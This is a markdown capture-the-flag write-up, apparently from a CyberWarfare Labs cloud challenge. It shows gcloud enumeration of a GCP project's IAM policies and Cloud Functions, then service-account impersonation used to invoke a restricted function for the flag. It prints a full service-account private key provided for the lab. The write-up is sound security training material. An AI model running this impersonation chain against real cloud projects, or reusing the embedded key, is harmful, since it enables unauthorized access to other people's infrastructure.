@@ -1,0 +1,256 @@
+---
+title: CWL - Service Account Impersonation Odyssey
+date: '2026-02-25'
+tags: ['cyberwarfarelabs', 'cloud']
+draft: false
+summary:  placeholder
+images: /static/images/cyberwarfare/cloud/sa_impersonate_odyssey/odyssey.png
+---
+
+
+<div className="flex justify-center">
+	<img src="/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/odyssey.png" alt="Description" />
+</div>
+
+
+
+<div className="flex justify-center">
+	<img src="/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/odyssey2.png" alt="Description" />
+</div>
+
+
+
+<TOCInline toc={props.toc} asDisclosure />
+
+
+
+
+## Authenticating into GCP
+
+We are provided the following credentials:
+
+
+```json
+{
+  "type": "service_account",
+  "project_id": "woven-acolyte-428406-v9",
+  "private_key_id": "cc2840530c4ab702b1e01f0b5bb3fb330ce52292",
+  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCc8xSh1I8k1Z3p\n3TkVUC8yYQoKvu3rGh++WoQ0P0Giy4k7evUQYZPuyRa9yxHlGXse2LtUy+ZUgZ+8\nFa41VWJDdB6kn/OWgHUZoVYFw5rNSDwuF0qfeInKmjnQYs+UlIRMDPd4CB0pbuTZ\nQo9RUqlC7wErt/7kwQFqR9rxJgRvSXLrDG8XlVev7bR4yjJekCJ+0CdPj7cnIO4I\nBZ/2pXD+DVc+iyL8DJ8J/WwrIEpi5m+7AdXIxgZ7xQDUnaty3u4ZBqP/jn7NKYe8\nBv/V93vpauSe1WSpR1cYSUvxC4zGzqkj6pIf2NOBVfdvpoAHNHxrNJYrGIpZ+Swd\nwavVswYVAgMBAAECggEAHmSvX+hlAP3SGwYBZih1P1UN6AdR1Qel0ou+UszWJdOz\nA178ApxW1LTBz+a5lCtTTaWsX08uDzrb50Uui3r5sLTVs00bU4+UPa6h1TNsMKk2\nqDlP9OJXkrG7lOhxqOT62qxfJvIxTYMBU7ZhQR8YEpNsn13+ASgEIWQBWNYjITaj\nHo+sAZikgXo2rK3n28gKY89/5wAwnMs3y3VJCJI7Y+DdXlT59QOWeuV9vmThyoMs\nsV0IqyJRUFwgI/z9kmkDm189Bvb0armiHxvl6/EDHpiNEWxJpD22JnTGKMHvPTUw\nFwql46WsCDfe7hpz2IiRN5zVbEyxP2rKuZZr6kUfwQKBgQDNurb7RlmajUjR4K7y\nsSKxf8onhTsMqoCuSPjQO1h0VqgCiMkfkK5cNJUKZkBdelWhQwnyG0GQUT+xqkky\na3ZoO9L5LmTagdmIdIHlcpWkH7ebBYkvl//jelXwsyH+JfAWBKsNQQiCJV8yrT8i\n/y+RvJpG6IWV5CYjDG2W/9CjwQKBgQDDTPilyA1oe9UbVqIxym0HixDBnftqWOK9\n/tH7VwsrIvh7LYnkCG6GPJHd1yhTrHXvIV+BCVAG8pd+ZPNNDWMqxHMabRztFYJm\nAd9wolk2oGGBHv3PV7h0MYvN58ign5mgwiHadi7+XHw9VuCnqSE3l4VJB4pJCqsM\nP0LBDgpnVQKBgFzdbqGoVOQl6HwMrwwQF3gGFiuWwVvrTyDdAauFTl1djINwWVEt\nTveCKNDD7UQE58heaYvm78aEVnsNQfNHfPB6KLagUZgsyxQEe2omOhQW2RtZ+V4J\nf9GgNFDtm2eMmn5l5wyZkYyl7/4BJCHZDRD9EKr3ZO2PSgPCJWnm2bhBAoGAbIOS\nDJsRSCK2EBCc4kl1NyG/17SuAzMMGUFC7wI4RGmT4u00lq1Qq+lvqvFniMZkaNAE\nPrAr9RBJuILi5McxeIva4K4LynePEpqryeuK4l1Oj+3mXJSC+pyk721//i9vrvDu\n2nGcPtyoc3SYMtA4kqjv99nmrhrtW0qzDo18nlkCgYBVQ/gs/22pMGVC9WARRNy7\n46muxSWVCTciGuFX8HappIn/ZQbEjLAHEE1qBLw5qLM4gu8tKBhkSgtpy/1SDfB9\nSoUUey31KykAz7ghDWLf2OxEpJGbumVH9rt9pi/nwXeBgFBBhAPgfFtmaECLtR09\n4MWAbQe0V5jGuQgpEd0gkg==\n-----END PRIVATE KEY-----",
+  "client_email": "hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com",
+  "client_id": "104201392735789077400",
+  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+  "token_uri": "https://oauth2.googleapis.com/token",
+  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/hd-service-account%40woven-acolyte-428406-v9.iam.gserviceaccount.com",
+  "universe_domain": "googleapis.com"
+}
+```
+
+Based on the credentials file, we are authenticating as `hd-service-account`. We can authenticate to the instance by first exporting the following variable to the `env` and supplying the credential file path:
+
+
+```bash
+export CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE="/home/mfkrypt/Downloads/GCPChallengeCredentials.json"
+```
+
+Then using `gcloud` CLI, we can try to list service accounts by supplying the `project_id` value
+
+
+```bash
+gcloud iam service-accounts list --project woven-acolyte-428406-v9
+```
+
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/1.png)
+
+
+
+
+
+## Enumeration
+
+
+### IAM policies
+
+It is discovered that the `hd-service-account` has the `serviceAccountTokenCreator` role on the 'Func Service Account'
+
+```bash
+gcloud iam service-accounts get-iam-policy func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/2.png)
+
+
+According to the [docs](https://docs.cloud.google.com/iam/docs/service-account-impersonation), service accounts with the `serviceAccountTokenCreator` role
+has the ability to impersonate a service account
+
+
+
+
+### Cloud Functions Enumeration
+
+
+```bash
+gcloud functions list --project woven-acolyte-428406-v9
+```
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/3.png)
+
+
+
+There are 4 Cloud Functions we should look into that are made up of 1st & 2nd gen functions of HTTP Triggers, let us describe these functions. I'll only
+highlight the important output
+
+
+```bash
+gcloud functions describe <FUNCTION> --project woven-acolyte-428406-v9
+```
+
+- `recovery-function`:
+
+
+```bash
+entryPoint: fun_main
+
+serviceAccountEmail: staging-mach-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+
+
+- `secops-function`:
+
+
+```bash
+description: Internal Cloud Function
+entryPoint: hello_world
+
+serviceAccountEmail: woven-acolyte-428406-v9@appspot.gserviceaccount.com
+```
+
+
+- `secops-internal-service-fn`:
+
+```bash
+entryPoint: fetch_secret
+
+serviceAccountEmail: secops-internal-service-mgmt-s@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+
+
+- `secops-internal-service-trigger-fn`:
+
+```bash
+entryPoint: forward_request
+
+serviceAccountEmail: secops-internal-service-mgmt-s@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+
+
+
+From the above, we can see that the `secops-function` uses the 'Default App Engine SA' with an entryPoint named `hello_world`,
+this could be a Cloud Function that was accidentally left on production. Let's check the IAM Policies on every Cloud Function
+
+
+```bash
+gcloud functions get-iam-policy <FUNCTION> --project woven-acolyte-428406-v9
+```
+
+
+- `recovery-function`:
+- `secops-internal-service-fn`:
+- `secops-internal-service-trigger-fn`:
+
+
+```bash
+bindings:
+- members:
+  - allUsers
+  role: roles/cloudfunctions.invoker
+etag: BwYlhdDpD80=
+version: 1
+```
+
+
+- `secops-function`:
+
+```bash
+bindings:
+- members:
+  - serviceAccount:func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+  role: projects/woven-acolyte-428406-v9/roles/customEditorNoDelete
+etag: BwYkvs8G-F0=
+version: 1
+```
+
+Attempting to invoke any of the functions with the `cloudfunctions.invoker` role will result in access denied...it is quite odd even though the 
+members are `allUsers`
+
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/5.png)
+
+
+
+### Custom Role Enumeration
+
+
+We can investigate the custom role further by describing it
+
+```bash
+gcloud iam roles describe customEditorNoDelete --project woven-acolyte-428406-v9
+```
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/4.png)
+
+
+These functions stand out:
+
+
+1. `cloudfunctions.functions.call`:
+
+
+An API that is a built-in method to invoke a Cloud Function using `gcloud`
+
+
+
+2. `cloudfunctions.functions.get`: 
+
+
+An API to look up the function metadata first
+
+
+
+## Impersonating Service Account & Invoking Cloud Function
+
+Let's try invoking the function
+
+```bash
+gcloud functions call secops-function --project woven-acolyte-428406-v9
+```
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/6.png)
+
+
+We get an access denied. Now, let's try impersonating the 'Func Service Account' and call the function again
+
+
+```bash
+gcloud functions call secops-function --project woven-acolyte-428406-v9 --impersonate-service-account=func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+
+![Description](/static/images/cyberwarfare/cloud/sa_impersonate_odyssey/7.png)
+
+
+
+There's our flag. Yay
+
+
+
+---
+
+## Sources
+
+
+- https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-cloud-functions-enum.html#enumeration
+- https://docs.cloud.google.com/iam/docs/service-account-impersonation
+- https://stackoverflow.com/questions/50921909/how-to-invoke-gcloud-with-service-account-impersonation
+- https://docs.cloud.google.com/functions/docs/reference/iam/roles
